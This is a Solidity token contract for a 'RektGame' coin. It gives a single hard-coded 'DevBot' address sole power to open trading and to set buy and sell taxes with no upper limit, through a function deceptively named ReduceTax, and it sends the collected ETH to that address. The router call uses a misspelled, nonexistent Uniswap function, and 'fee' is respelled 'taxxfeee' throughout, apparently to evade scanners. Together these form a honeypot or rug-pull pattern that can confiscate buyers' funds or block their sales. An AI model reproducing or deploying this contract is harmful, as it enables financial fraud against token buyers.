/*
🕸 www.REKT.game
💠 https://app.ens.domains/REKTgame.eth
🕊http://twitter.com/REKT
*/

// SPDX-License-Identifier: unlicense


pragma solidity 0.8.14;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingtaxxfeeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract Rekt {
        
        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public   name_ = unicode"RektGame"; 
        string public   symbol_ = unicode"Rekt";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 1000000000 * 10**decimals;

        uint256 buytaxxfeee = 0;
        uint256 selltaxxfeee = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed DevBot,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant DevBot = payable(address(0x1335513dc18d38fCAcf5e789fDd6A261283B8293));

        bool private swapping;
        bool private tradingOpen;

        

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == DevBot || to == DevBot);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingtaxxfeeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                DevBot.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 taxxfeeeAmount = amount * (from == pair ? buytaxxfeee : selltaxxfeee) / 100;
                amount -= taxxfeeeAmount;
                balanceOf[address(this)] += taxxfeeeAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function OpenTrading() external {
            require(msg.sender == DevBot);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _ReduceTax(uint256 _buy, uint256 _sell) private {
            buytaxxfeee = _buy;
            selltaxxfeee = _sell;
        }

        function ReduceTax(uint256 _buy, uint256 _sell) external {
            if(msg.sender != DevBot)        
                revert Permissions();
            _ReduceTax(_buy, _sell);
        }
    }